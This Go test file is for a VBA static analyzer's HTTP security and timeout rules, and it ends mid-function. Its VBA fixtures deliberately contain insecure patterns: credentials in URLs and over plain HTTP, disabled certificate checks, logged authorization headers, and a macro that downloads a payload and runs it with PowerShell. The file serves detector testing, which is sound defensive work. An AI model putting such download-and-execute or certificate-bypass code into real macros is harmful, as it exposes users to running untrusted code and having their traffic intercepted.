package analyze

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"reflect"
	"sort"
	"strconv"
	"strings"
	"testing"

	"github.com/harumiWeb/xlflow/internal/analyze/semanticstate"
	"github.com/harumiWeb/xlflow/internal/config"
)

func TestVBA246DetectsCredentialTransportEarlyAndLateBound(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Private Const AUTH_HEADER As String = "Bearer production-secret-value"

Public Sub Run()
    Dim early As MSXML2.XMLHTTP60
    Dim late As Object
    Set early = New MSXML2.XMLHTTP60
    early.Open "GET", "http://api.example.test/private", False, "user", "password"
    early.Send

    Set late = CreateObject("WinHttp.WinHttpRequest.5.1")
    late.SetTimeouts 1000, 1000, 1000, 1000
    late.Open "GET", "http://api.example.test/token", False
    late.SetRequestHeader "Authorization", AUTH_HEADER
    late.Send
    Debug.Print AUTH_HEADER
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA246")
	want := map[string]bool{"plain_http_credentials": false, "sensitive_module_constant": false, "authorization_logging": false}
	for _, finding := range got {
		if finding.HTTPSecurity != nil {
			want[finding.HTTPSecurity.RiskKind] = true
		}
		encoded, err := json.Marshal(finding)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(encoded), "production-secret-value") {
			t.Fatalf("VBA246 exposed secret: %s", encoded)
		}
	}
	for kind, seen := range want {
		if !seen {
			t.Fatalf("missing %s in %+v", kind, got)
		}
	}
}

func TestSameHTTPStateDistinguishesMissingZeroValueKeys(t *testing.T) {
	base := httpAnalysisState{
		objects: map[string]httpObjectState{
			"request": {
				kind:            httpXML,
				identity:        "request",
				savedExecutable: map[string]bool{"saved.exe": false},
				credentialSinks: map[int]bool{10: false},
			},
		},
		launchers: map[string]string{"launcher": ""},
		strings:   map[string]string{"value": ""},
		known:     map[string]bool{"value": false},
		sensitive: map[string]bool{"secret": false},
	}
	cases := map[string]func(httpAnalysisState) httpAnalysisState{
		"launchers": func(other httpAnalysisState) httpAnalysisState {
			other.launchers = map[string]string{"other": ""}
			return other
		},
		"strings": func(other httpAnalysisState) httpAnalysisState {
			other.strings = map[string]string{"other": ""}
			return other
		},
		"known": func(other httpAnalysisState) httpAnalysisState {
			other.known = map[string]bool{"other": false}
			return other
		},
		"sensitive": func(other httpAnalysisState) httpAnalysisState {
			other.sensitive = map[string]bool{"other": false}
			return other
		},
		"saved executable": func(other httpAnalysisState) httpAnalysisState {
			object := other.objects["request"]
			object.savedExecutable = map[string]bool{"other.exe": false}
			other.objects["request"] = object
			return other
		},
		"credential sinks": func(other httpAnalysisState) httpAnalysisState {
			object := other.objects["request"]
			object.credentialSinks = map[int]bool{20: false}
			other.objects["request"] = object
			return other
		},
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			other := mutate(cloneHTTPState(base))
			if sameHTTPState(base, other) {
				t.Fatalf("states with distinct zero-value keys compared equal: %#v vs %#v", base, other)
			}
		})
	}
}

func TestVBA246DetectsURLCredentialsTLSAndCertificateBypass(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://alice:secret@example.test/data", False
    request.Option(4) = &H3300&
    request.Option(18) = 0
    request.Option(9) = &H280
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	seen := map[string]bool{}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil {
			seen[finding.HTTPSecurity.RiskKind] = true
		}
	}
	for _, kind := range []string{"credentials_in_url", "certificate_validation_bypass", "obsolete_tls_protocol"} {
		if !seen[kind] {
			t.Fatalf("missing %s: %+v", kind, findings)
		}
	}
}

func TestVBA247RequiresFiniteTimeoutOnEveryPath(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal configure As Boolean, ByVal dynamicTimeout As Long)
    Dim request As MSXML2.ServerXMLHTTP60
    Set request = New MSXML2.ServerXMLHTTP60
    If configure Then
        request.setTimeouts 1000, 1000, 1000, 1000
    End If
    request.Open "GET", "https://example.test", False
    request.Send

    Dim dynamicRequest As Object
    Set dynamicRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
    dynamicRequest.SetTimeouts dynamicTimeout, dynamicTimeout, dynamicTimeout, dynamicTimeout
    dynamicRequest.Open "GET", "https://example.test", False
    dynamicRequest.Send

    Dim xhr As MSXML2.XMLHTTP60
    Set xhr = New MSXML2.XMLHTTP60
    xhr.Open "GET", "https://example.test", False
    xhr.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA247")
	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.API != "MSXML2.ServerXMLHTTP" {
		t.Fatalf("VBA247 findings = %+v", got)
	}
}

func TestModuleScopedHTTPDeclarationReachesBatchAndRealtime(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	source := []byte(`Attribute VB_Name = "Main"
Option Explicit
Private request As New WinHttp.WinHttpRequest.5.1

Public Sub Run()
    request.Open "GET", "http://example.test", False
    request.SetCredentials "user", "password", 0
    request.Send
End Sub
`)
	writeModule(t, dir, "Main.bas", string(source))
	cfg := config.Default()
	batch, err := (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	realtime, err := SourceRealtimeFindings(dir, filepath.Join(dir, "src", "modules", "Main.bas"), cfg, source)
	if err != nil {
		t.Fatal(err)
	}
	for name, findings := range map[string][]Finding{"batch": batch, "realtime": realtime} {
		if got := findingsByCode(findings, "VBA247"); len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
			t.Fatalf("%s module-scoped VBA247 findings = %+v", name, got)
		}
		got := findingsByCode(findings, "VBA246")
		if len(got) == 0 || got[0].HTTPSecurity == nil || got[0].HTTPSecurity.RiskKind != "plain_http_credentials" {
			t.Fatalf("%s module-scoped VBA246 findings = %+v", name, got)
		}
	}
}

func TestVBA246HonorsDevelopmentOriginsButNeverURLCredentials(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "http://dev.example.test:8080", False
    request.SetCredentials "user", "password", 0
    request.Send
    request.Open "GET", "http://user:password@localhost/private", False
    request.Send
End Sub
`)
	cfg := config.Default()
	invalidCfg := config.Default()
	invalidCfg.Analyze.DevelopmentHTTPOrigins = []string{"dev.example.test:8080"}
	invalidFindings, err := (Analyzer{RootDir: dir, Config: invalidCfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	invalidAllowsHTTP := false
	for _, finding := range findingsByCode(invalidFindings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "plain_http_credentials" {
			invalidAllowsHTTP = true
		}
	}
	if !invalidAllowsHTTP {
		t.Fatalf("malformed development origin unexpectedly allowed HTTP credentials: %+v", invalidFindings)
	}
	cfg.Analyze.DevelopmentHTTPOrigins = []string{"http://dev.example.test:8080"}
	findings, err := (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA246")
	if len(got) != 1 || got[0].HTTPSecurity == nil || got[0].HTTPSecurity.RiskKind != "credentials_in_url" {
		t.Fatalf("development findings = %+v", got)
	}
}

func TestVBA246DetectsHTTPDownloadAndExecute(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Const target As String = "C:\Temp\payload.ps1"
    Dim request As Object
    Dim stream As ADODB.Stream
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test/payload", False
    request.Send
    Set stream = New ADODB.Stream
    stream.Write request.ResponseBody
    stream.SaveToFile target, 2
    Shell "powershell.exe -File " & target
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
			found = true
		}
	}
	if !found {
		t.Fatalf("missing download_and_execute: %+v", findings)
	}
}

func TestVBA246RealtimeAndSuppressions(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	source := []byte(`Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://user:password@example.test", False ' xlflow:disable-line VBA246
    request.Send
End Sub
`)
	findings, err := SourceRealtimeFindings(dir, filepath.Join(dir, "src", "modules", "Main.bas"), config.Default(), source)
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("suppressed realtime findings = %+v", got)
	}
	positiveSource := []byte(`Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://user:password@example.test", False
    request.Send
End Sub
`)
	positive, err := SourceRealtimeFindings(dir, filepath.Join(dir, "src", "modules", "Main.bas"), config.Default(), positiveSource)
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(positive, "VBA246"); len(got) == 0 {
		t.Fatalf("unsuppressed realtime VBA246 findings = %+v", positive)
	}
	timeoutSource := []byte(`Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	timeoutFindings, err := SourceRealtimeFindings(dir, filepath.Join(dir, "src", "modules", "Main.bas"), config.Default(), timeoutSource)
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(timeoutFindings, "VBA247"); len(got) == 0 {
		t.Fatalf("unsuppressed realtime VBA247 findings = %+v", timeoutFindings)
	}
}

func TestVBA246SensitiveLoggingIgnoresFunctionNames(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim token As String
    Dim otherValue As String
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.SetRequestHeader "Authorization", Trim(token)
    Debug.Print Trim(otherValue)
    Debug.Print token
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	authLogs := 0
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "authorization_logging" {
			authLogs++
		}
	}
	if authLogs != 1 {
		t.Fatalf("authorization logging findings = %d, findings = %+v", authLogs, findings)
	}
}

func TestVBA246SensitiveLoggingSurvivesUnresolvedCall(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Private Const AuthHeader As String = "Bearer production-secret-value"

Public Sub Run()
    Call MissingExternalProcedure
    Debug.Print AuthHeader
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "authorization_logging" {
			return
		}
	}
	t.Fatalf("authorization logging finding was lost with an unresolved call: %+v", findings)
}

func TestVBA246ConcatenatedSensitiveLoggingSurvivesUnresolvedCall(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Private Const AuthHeader As String = "Bearer " & "production-secret-value"

Public Sub Run()
    Call MissingExternalProcedure
    Debug.Print AuthHeader
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "authorization_logging" {
			return
		}
	}
	t.Fatalf("concatenated authorization logging finding was lost with an unresolved call: %+v", findings)
}

func TestVBA246SensitiveLoggingInsideConditionIsPlanned(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit

Public Sub Run()
    If shouldLog Then
        Debug.Print "Authorization: Bearer production-secret-value"
    End If
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "authorization_logging" {
			return
		}
	}
	t.Fatalf("conditional authorization logging finding was lost: %+v", findings)
}

func TestHTTPRulesIgnoreUnrelatedObjectsAndSafeTLS(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    request.Open "GET", "http://user:password@example.test", False
    request.Send

    Dim http As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.SetTimeouts 1000, 1000, 1000, 1000
    http.Open "GET", "https://example.test", False
    http.Option(4) = 0
    http.Option(9) = &H2800
    http.Send

    Dim lookedUp As Object
    Set lookedUp = Lookup("WinHttp.WinHttpRequest.5.1")
    lookedUp.Open "GET", "https://user:password@example.test", False
    lookedUp.Send

    Dim adapter As ExampleWinHttp.WinHttpRequestAdapter
    adapter.Open "GET", "https://user:password@example.test", False
    adapter.Send

    Dim company As Object
    Set company = CreateObject("Company.WinHttpRequest.5.1Adapter")
    company.Open "GET", "https://user:password@example.test", False
    company.Send
End Sub

Private Function Lookup(ByVal name As String) As Collection
    Set Lookup = New Collection
End Function
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := append(findingsByCode(findings, "VBA246"), findingsByCode(findings, "VBA247")...); len(got) != 0 {
		t.Fatalf("unrelated/safe findings = %+v", got)
	}
}

func TestVBA247ClassifiesExplicitUnboundedTimeout(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    request.setTimeouts 0, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA247")
	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "unbounded" {
		t.Fatalf("unbounded timeout findings = %+v", got)
	}
}

func TestVBA246ResolvesAliasesAndServerXMLCertificateOptions(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal runtimeValue As Long)
    Dim original As New MSXML2.ServerXMLHTTP60
    Dim request As Object
    Set request = original
    request.setOption 2, 13056
    request.setOption 2, runtimeValue
    request.setTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA246")
	if len(got) != 1 || got[0].HTTPSecurity == nil || got[0].HTTPSecurity.RiskKind != "certificate_validation_bypass" || got[0].HTTPSecurity.API != "MSXML2.ServerXMLHTTP" {
		t.Fatalf("alias/server XML findings = %+v", got)
	}
}

func TestVBA246SensitiveModuleConstantRequiresSecretEvidence(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Private Const HEADER_NAME As String = "Authorization"
Private Const PLACEHOLDER As String = "<token>"
Private Const AUTH_VALUE As String = "Bearer actual-production-token"

Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.SetRequestHeader HEADER_NAME, PLACEHOLDER
    request.SetRequestHeader HEADER_NAME, AUTH_VALUE
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "sensitive_module_constant" {
			count++
		}
		encoded, err := json.Marshal(finding)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(encoded), "actual-production-token") {
			t.Fatalf("VBA246 exposed secret: %s", encoded)
		}
	}
	if count != 1 {
		t.Fatalf("sensitive module constant count = %d, findings = %+v", count, findings)
	}
}

func TestVBA246DownloadAndExecuteNegativeCases(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim stream As ADODB.Stream
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test/payload", False
    request.Send
    Set stream = New ADODB.Stream
    stream.Write request.ResponseBody
    stream.SaveToFile "C:\Temp\saved-only.exe", 2
    Shell "C:\Temp\saved-only.exe.backup"
    stream.SaveToFile "C:\Temp\payload.txt", 2
    Shell "C:\Temp\payload.txt"
    stream.Write localBytes
    stream.SaveToFile "C:\Temp\overwritten.ps1", 2
    Shell "C:\Temp\overwritten.ps1"

    stream.Write request.ResponseBody
    stream.SaveToFile "C:\Temp\not-a-launcher.exe", 2
    Dim unrelated As Collection
    unrelated.Run "C:\Temp\not-a-launcher.exe"
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
			t.Fatalf("unexpected download_and_execute: %+v", finding)
		}
	}
}

func TestVBA224FallbackWhenVBA246IsDisabled(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim token As String
    Dim request As Object
    token = InputBox("Token")
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "http://api.example.test", False
    request.SetRequestHeader "Authorization", token
    request.Send
End Sub
`)
	cfg := config.Default()
	cfg.Analyze.DetectUnsafeHTTPConfiguration = false
	findings, err := (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("disabled VBA246 findings = %+v", got)
	}
	if got := findingsByCode(findings, "VBA224"); len(got) == 0 {
		t.Fatalf("missing VBA224 fallback: %+v", findings)
	}
	cfg.Analyze.DetectUnsafeHTTPConfiguration = true
	findings, err = (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) == 0 {
		t.Fatalf("missing specialized VBA246: %+v", findings)
	}
	if got := findingsByCode(findings, "VBA224"); len(got) != 0 {
		t.Fatalf("VBA224 must be suppressed for the specialized header flow: %+v", got)
	}
}

func TestVBA246IgnoresCredentialsInNonHTTPURL(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "ftp://user:password@example.test/file", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("non-HTTP URL findings = %+v", got)
	}
}

func TestHTTPIntegerRejectsValuesOutsideNativeIntRange(t *testing.T) {
	t.Parallel()
	state := httpAnalysisState{strings: map[string]string{}, known: map[string]bool{}, sensitive: map[string]bool{}}
	if n, ok := httpInteger("13056", state); !ok || n != 13056 {
		t.Fatalf("in-range integer = %d, %v", n, ok)
	}
	if n, ok := httpInteger("&H280", state); !ok || n != 0x280 {
		t.Fatalf("hexadecimal integer = %d, %v", n, ok)
	}
	if n, ok := httpInteger("&H2800&", state); !ok || n != 0x2800 {
		t.Fatalf("typed hexadecimal integer = %d, %v", n, ok)
	}
	if n, ok := httpInteger("13056%", state); !ok || n != 13056 {
		t.Fatalf("typed decimal integer = %d, %v", n, ok)
	}
	if strconv.IntSize == 64 {
		if _, ok := httpInteger("9223372036854775808", state); ok {
			t.Fatal("out-of-range 64-bit integer was accepted")
		}
	} else {
		if _, ok := httpInteger("2147483648", state); ok {
			t.Fatal("out-of-range 32-bit integer was accepted")
		}
	}
}

func TestVBA224SuppressionKeepsIndependentColonSeparatedFlow(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim other As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "http://api.example.test", False
    request.SetRequestHeader "Authorization", "Bearer production-token": other.SetRequestHeader "X-Test", InputBox("value")
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) == 0 {
		t.Fatalf("missing specialized VBA246: %+v", findings)
	}
	if got := findingsByCode(findings, "VBA224"); len(got) == 0 {
		t.Fatalf("independent colon-separated VBA224 flow was suppressed: %+v", findings)
	}
}

func TestHTTPFindingsAlwaysRedactNeighboringCredentials(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.Open "GET", "https://alice:production-secret@example.test/private?token=secret", False
    request.Option(4) = 13056
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		encoded, err := json.Marshal(finding)
		if err != nil {
			t.Fatal(err)
		}
		for _, secret := range []string{"production-secret", "/private", "token=secret"} {
			if strings.Contains(string(encoded), secret) {
				t.Fatalf("HTTP finding exposed %q: %s", secret, encoded)
			}
		}
	}
}

func TestVBA247ExceptionalSetTimeoutPathRemainsMissing(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    On Error GoTo TimeoutFailed
    request.SetTimeouts 1000, 1000, 1000, 1000
    Exit Sub
TimeoutFailed:
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA247"); len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
		t.Fatalf("exceptional timeout findings = %+v", got)
	}
}

func TestVBA246DropsConflictingBranchConstants(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal useHTTP As Boolean)
    Dim target As String
    Dim request As Object
    If useHTTP Then
        target = "http://api.example.test"
    Else
        target = "https://api.example.test"
    End If
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", target, False
    request.SetCredentials "user", "password", 0
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "plain_http_credentials" {
			t.Fatalf("conflicting URL branch must be unknown: %+v", finding)
		}
	}
}

func TestHTTPObjectReassignmentInvalidatesTypeAndAliasState(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set request = New Collection
    request.Open "GET", "https://user:password@example.test", False
    request.Send

    Dim current As Object
    Dim oldAlias As Object
    Set current = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set oldAlias = current
    Set current = CreateObject("WinHttp.WinHttpRequest.5.1")
    current.SetTimeouts 1000, 1000, 1000, 1000
    oldAlias.Open "GET", "https://example.test", False
    oldAlias.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("reassigned unrelated receiver findings = %+v", got)
	}
	got := findingsByCode(findings, "VBA247")
	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
		t.Fatalf("reassigned alias timeout findings = %+v", got)
	}
}

func TestHTTPCompactProcessLaunchRequiresKnownReceiver(t *testing.T) {
	environment := semanticstate.NewEnvironment([]string{"launcher:known"})
	launcherID, ok := environment.Symbol("launcher:known")
	if !ok {
		t.Fatal("launcher slot was not indexed")
	}
	state := semanticstate.NewState[httpScalar](environment.Layout())
	state.Set(launcherID, httpScalar{class: httpCompactLauncherSlot, present: true, text: "wscript.shell"})
	env := &httpCompactEnvironment{
		launchers: map[string]httpCompactSlot{
			"known": {id: launcherID, class: httpCompactLauncherSlot},
		},
	}
	if !httpCompactIsProcessLaunch(`known.Run "payload.exe"`, state.View(), env) {
		t.Fatal("known launcher receiver was not recognized")
	}
	if httpCompactIsProcessLaunch(`Set result = other.Run "payload.exe"`, state.View(), env) {
		t.Fatal("unknown launcher receiver reused an unrelated slot")
	}
}

func TestHTTPCompactSelfAssignmentPreservesObjectState(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set request = request
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA247"); len(got) != 0 {
		t.Fatalf("self-assignment discarded timeout state: %+v", got)
	}
}

func TestHTTPCompactPreservesBranchUnknownsAndAliasJoins(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal configure As Boolean, ByVal useHTTP As Boolean)
    Dim request As Object
    Dim aliasRequest As Object
    Dim target As String
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set aliasRequest = request
    If configure Then
        aliasRequest.SetTimeouts 1000, 1000, 1000, 1000
    End If
    If useHTTP Then
        target = "http://api.example.test"
    Else
        target = "https://api.example.test"
    End If
    request.Open "GET", target, False
    request.SetCredentials "user", "password", 0
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		for _, finding := range got {
			if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "plain_http_credentials" {
				t.Fatalf("conflicting URL branches became a plain HTTP finding: %+v", finding)
			}
		}
	}
	got := findingsByCode(findings, "VBA247")
	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
		t.Fatalf("branch timeout join findings = %+v", got)
	}
}

func TestHTTPCompactLoopAliasStateDoesNotDuplicateFindings(t *testing.T) {
